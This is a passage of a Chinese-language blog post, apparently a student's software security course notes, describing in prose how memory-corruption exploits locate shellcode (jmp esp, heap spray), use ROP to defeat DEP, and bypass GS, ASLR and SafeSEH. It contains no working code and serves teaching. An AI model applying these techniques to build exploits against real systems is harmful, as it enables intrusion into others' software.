<h2 id="地址定位技术"><a href="#地址定位技术" class="headerlink" title="地址定位技术"></a>地址定位技术</h2><h3 id="静态shellcode地址的利用技术"><a href="#静态shellcode地址的利用技术" class="headerlink" title="静态shellcode地址的利用技术"></a>静态shellcode地址的利用技术</h3><p>​    如果存在溢出漏洞的程序，是一个操作系统每次启动都要加载的程序，操作系统启动时为其分配的内存地址一般是固定的，则函数调用时分配的栈帧地址也是固定的</p>
<p>​    这种情况下，溢出后写入栈帧的shellcode代码其内存地址也是静态不变的，所以可以直接将shellcode代码在栈帧中的<strong>静态地址覆盖原有返回地址</strong>。在函数返回时，通过<strong>新的返回地址指向shellcode代码地址</strong>，从而执行shellcode代码</p>
<p><img src="/images/软件安全/图片99.png" alt=""></p>
<h3 id="基于跳板指令的地址定位技术"><a href="#基于跳板指令的地址定位技术" class="headerlink" title="基于跳板指令的地址定位技术"></a>基于跳板指令的地址定位技术</h3><p>​    有些软件的漏洞存在于某些动态链接库中，它们在进程运行时被动态加载，因而在下一次被重新装载到内存中时，其<strong>在内存中的栈帧地址是动态变化</strong>的，则<strong>植入的shellcode代码在内存中的起始地址也是变化</strong>的。此外，如果在使用ASLR技术的操作系统中，地址会因为引入的随机数每次发生变化，此时，需要让覆盖返回地址后新写入的返回地址能够自动定位到shellcode的起始地址</p>
<p>为了解决这个问题，可以利用esp寄存器的特性实现：</p>
<ul>
<li>在函数调用结束后，被调用函数的栈帧被释放，esp寄存器中的栈顶指针指向返回地址<strong>在内存高地址方向的相邻位置</strong>。</li>
<li>可见，通过esp寄存器，可以<strong>准确定位返回地址所在的位置</strong>。 </li>
</ul>
<p>具体定位步骤：</p>
<ul>
<li>第一步，找到内存中任意一个汇编指令jmp esp，这条指令执行后可跳转到esp寄存器保存的地址，下面准备在溢出后将这条指令的地址覆盖返回地址</li>
<li>第二步，设计好缓冲区溢出漏洞利用程序中的输入数据，使缓冲区溢出后，前面的填充内容为任意数据，紧接着覆盖返回地址的是jmp esp指令的地址，再接着覆盖与返回地址相邻的高地址位置并写入shellcode代码</li>
<li>第三步，函数调用完成后函数返回，根据返回地址中指向的jmp esp指令的地址去执行jmp esp操作，即跳转到esp寄存器中保存的地址，而函数返回后esp中保存的地址是与返回地址相邻的高地址位置，在这个位置保存的是shellcode代码，则shellcode代码被执行</li>
</ul>
<p>​    对于查找<strong>jmp esp的指令地址</strong>，可以在系统常用的<strong>user32.dll等动态链接库</strong>，或者其他被所有程序都加载的模块中查找，这些动态链接库或者模块加载的基地址始终是固定的</p>
<p><img src="/images/软件安全/图片134.png" alt=""></p>
<h3 id="内存喷洒技术"><a href="#内存喷洒技术" class="headerlink" title="内存喷洒技术"></a>内存喷洒技术</h3><p>​    有些特殊的软件漏洞，不支持或者不能实现精确定位shellcode。同时，存在漏洞的软件其加载地址动态变化，采用shellcode的静态地址覆盖方法难以实施。由于堆分配地址随机性较大，为了解决shellcode在堆中的定位以便触发，可以采用<strong>heap spray</strong>的方法</p>
<p>​    内存喷射技术的代表是<strong>堆喷洒Heap spray</strong>，也称为<strong>堆喷洒技术</strong>，是在shellcode的前面加上大量的滑板指令（slide code），组成一个非常长的注入代码段。然后向系统申请大量内存，并且反复用这个注入代码段来填充。这样就使得内存空间被大量的注入代码所占据。攻击者再结合漏洞利用技术，只要使程序跳转到堆中被填充了注入代码的任何一个地址，程序指令就会顺着滑板指令最终执行到shellcode代码</p>
<p>​    滑板指令（slide code）是由大量NOP(no-operation)空指令0x90填充组成的指令序列，当遇到这些NOP指令时，CPU指令指针会一个指令接一个指令的执行下去，中间不做任何具体操作，直到“滑”过最后一个滑板指令后，接着执行这些指令后面的其他指令，往往后面接着的是shellcode代码。随着一些新的攻击技术的出现，滑板指令除了利用NOP指令填充外，也逐渐开始使用更多的类NOP指令，譬如0x0C，0x0D（回车、换行）等</p>
<p>​    Heap Spray技术通过使用类NOP指令来进行覆盖，对shellcode地址的跳转准确性要求不高了，从而增加了缓冲区溢出攻击的成功率。然而，Heap Spray会导致被攻击进程的内存占用非常大，计算机无法正常运转，因而容易被察觉。针对Heap Spray，对于windows系统比较好的系统防范办法是开启DEP功能，即使被绕过，被利用的概率也会大大降低</p>
<h2 id="API函数自搜索技术"><a href="#API函数自搜索技术" class="headerlink" title="API函数自搜索技术"></a>API函数自搜索技术</h2><p>​    编写通用shellcode，shellcode自身就必须具备动态的自动搜索所需API函数地址的能力，即API函数自搜索技术</p>
<p>定位LoadLibrary函数的步骤如下：</p>
<ul>
<li>第一步：定位kernel32.dll。</li>
<li>第二步：解析kernel32.dll的导出表</li>
<li>第三步：搜索定位LoadLibrary等目标函数。</li>
<li>第四步：基于找到的函数地址，完成Shellcode的编写。</li>
</ul>
<p><img src="/images/软件安全/屏幕截图 2024-04-18 233317.png" alt=""></p>
<h2 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h2><p>​    简称ROP，是一种新型的基于代码复用技术的攻击，它从已有的库或者可执行文件中提取指令片段，构建恶意代码</p>
<p>基本思想：</p>
<ul>
<li>借助已存在的代码块(也叫配件，Gadget)，这些配件来自程序已经加载的模块；</li>
<li>在已加载的模块中找到一些以retn结尾的配件，把这些配件的地址布置在堆栈上, 当控制EIP并返回时候, 程序就会跳去执行这些小配件；</li>
<li>这些小配件是在别的模块代码段, 不受DEP的影响</li>
</ul>
<p>ROP技术：</p>
<ol>
<li>ROP通过ROP链（retn）实现有序汇编指令的执行。</li>
<li>ROP链由一个个ROP小配件（Gadget，相当于一个小节点）组成。</li>
<li>ROP小配件由“目的执行指令+retn指令组成”。</li>
</ol>
<p>基于RP的漏洞利用：</p>
<ol>
<li>调用相关API关闭或绕过DEP保护。相关的API包括SetProcessDEPPlolicy、VirtualAlloc、NtSetInformationProcess、VirtualProtect等，比如VirtualProtect函数可以将内存块的属性修改为Executable。</li>
<li>实现地址跳转，直接转向不受DEP保护的区域里保存的shellcode执行。</li>
<li>调用相关API将shellcode写入不受DEP保护的可执行内存。进而，配合基于ROP编写的地址跳转指令，完成漏洞利用。</li>
</ol>
<h2 id="绕过其它安全防护"><a href="#绕过其它安全防护" class="headerlink" title="绕过其它安全防护"></a>绕过其它安全防护</h2><h3 id="绕过GS安全机制"><a href="#绕过GS安全机制" class="headerlink" title="绕过GS安全机制"></a>绕过GS安全机制</h3><p>​    Visual Studio在实现GS安全机制的时候，除了增加Cookie，还会对栈中变量进行重新排序，比如：将字符串缓冲区分配在栈帧的最高地址上，因此，当字符串缓冲区溢出，就不能覆盖本地变量了。<br>​    但是，考虑到效率问题，它仅按照函数隐患及危害程度进行选择性保护，因此有一部分函数可能没有得到有效的保护。比如：结构成员因为互操作性问题而不能重新排列，因此当它们包含缓冲区时，这个缓冲区溢出就可以将之后其它成员覆盖和控制。</p>
<p>​    正是因为GS安全机制存在这些缺陷，所以聪明的攻击者构造出了各种办法来绕过GS保护机制。David Litchfield在2003年提出了一个技术来绕过GS保护机制：<strong>如果Cookie被一个不同的值覆盖了，代码会检查是否安装了安全处理例程，如果没有，系统的异常处理器就将接管它。</strong><br>​    如果黑客覆盖掉了一个异常处理结构，并在Cookie被检查前触发一个异常，这时栈中虽然仍然存在Cookie，但是还是可以被成功溢出。这个方法相当于是利用SEH进行漏洞攻击。可以说，GS安全机制最重要的一个缺陷是没有保护异常处理器，但这点上虽然有SEH保护机制作为后盾，但SEH保护机制也是可以被绕过的。</p>
<h3 id="ASLR缺陷和绕过方法"><a href="#ASLR缺陷和绕过方法" class="headerlink" title="ASLR缺陷和绕过方法"></a>ASLR缺陷和绕过方法</h3><p>这个技术存在很多脆弱性：</p>
<ol>
<li>为了减少虚拟地址空间的碎片，操作系统把随机加载库文件的地址限制为8位，即地址空间为256，而且随机化发生在地址前两个最有意义的字节上；</li>
<li>很多应用程序和DLL模块并没有采用/DYNAMICBASE的编译选项；</li>
<li>很多应用程序使用相同的系统DLL文件，这些系统DLL加载后地址就确定下来了，对于本地攻击，攻击者还是很容易就能获得所需要的地址，然后进行攻击。</li>
</ol>
<p>还有一些其他的攻击方法：<strong>攻击未开启地址随机化的模块（作为跳板）、堆喷洒技术、部分返回地址覆盖法</strong>等。</p>
<h3 id="SEH保护机制缺陷和绕过方法"><a href="#SEH保护机制缺陷和绕过方法" class="headerlink" title="SEH保护机制缺陷和绕过方法"></a>SEH保护机制缺陷和绕过方法</h3><p>​    当一个进程中存在一个不是/SafeSEH编译的DLL或者库文件的时候，整个SafeSEH机制就可能失效。因为/SafeSEH编译选项需要.NET的编译器支持，现在仍有大量第三方库和程序没有使用该编译器编译或者没有启动/SafeSEH选项</p>
<p>可行的绕过方法：</p>
<ul>
<li>利用未开启SafeSEH的模块作为跳板绕过：可以在未启用SafeSEH的模块里找一些跳转指令，覆盖SEH函数指针，由于这些指令在未启用SafeSEH的模块里，因此异常触发时，可以执行到这些指令。</li>
<li>利用加载模块之外的地址进行绕过：可以利用加载模块之外的地址，包括从堆中进行绕过或者其他一些特定内存绕过。</li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter3/" rel="next" title="软件安全笔记Chapter3">
                <i class="fa fa-chevron-left"></i> 软件安全笔记Chapter3
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2024/11/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0Chapter4/" rel="prev" title="软件安全笔记Chapter4">
                软件安全笔记Chapter4 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">第五章 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞利用概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E4%B8%B4%E6%8E%A5%E5%8F%98%E9%87%8F%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.2.</span> <span class="nav-text">覆盖临接变量示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellcode%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.</span> <span class="nav-text">Shellcode代码植入示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellcode%E7%BC%96%E5%86%99"><span class="nav-number">1.4.</span> <span class="nav-text">Shellcode编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellcode%E7%BC%96%E7%A0%81"><span class="nav-number">1.5.</span> <span class="nav-text">Shellcode编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF"><span class="nav-number">1.6.</span> <span class="nav-text">Windows安全防护技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ASLR"><span class="nav-number">1.6.1.</span> <span class="nav-text">ASLR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GS-Stack-protection"><span class="nav-number">1.6.2.</span> <span class="nav-text">GS Stack protection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DEP"><span class="nav-number">1.6.3.</span> <span class="nav-text">DEP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SafeSEH"><span class="nav-number">1.6.4.</span> <span class="nav-text">SafeSEH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SEHOP"><span class="nav-number">1.6.5.</span> <span class="nav-text">SEHOP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D%E6%8A%80%E6%9C%AF"><span class="nav-number">1.7.</span> <span class="nav-text">地址定位技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81shellcode%E5%9C%B0%E5%9D%80%E7%9A%84%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="nav-number">1.7.1.</span> <span class="nav-text">静态shellcode地址的利用技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B7%B3%E6%9D%BF%E6%8C%87%E4%BB%A4%E7%9A%84%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D%E6%8A%80%E6%9C%AF"><span class="nav-number">1.7.2.</span> <span class="nav-text">基于跳板指令的地址定位技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%96%B7%E6%B4%92%E6%8A%80%E6%9C%AF"><span class="nav-number">1.7.3.</span> <span class="nav-text">内存喷洒技术</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API%E5%87%BD%E6%95%B0%E8%87%AA%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF"><span class="nav-number">1.8.</span> <span class="nav-text">API函数自搜索技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B"><span class="nav-number">1.9.</span> <span class="nav-text">返回导向编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%85%B6%E5%AE%83%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-number">1.10.</span> <span class="nav-text">绕过其它安全防护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87GS%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">1.10.1.</span> <span class="nav-text">绕过GS安全机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASLR%E7%BC%BA%E9%99%B7%E5%92%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.10.2.</span> <span class="nav-text">ASLR缺陷和绕过方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SEH%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BC%BA%E9%99%B7%E5%92%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.10.3.</span> <span class="nav-text">SEH保护机制缺陷和绕过方法</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Luhaozhhhe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>






    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  


  

  

</body>
</html>
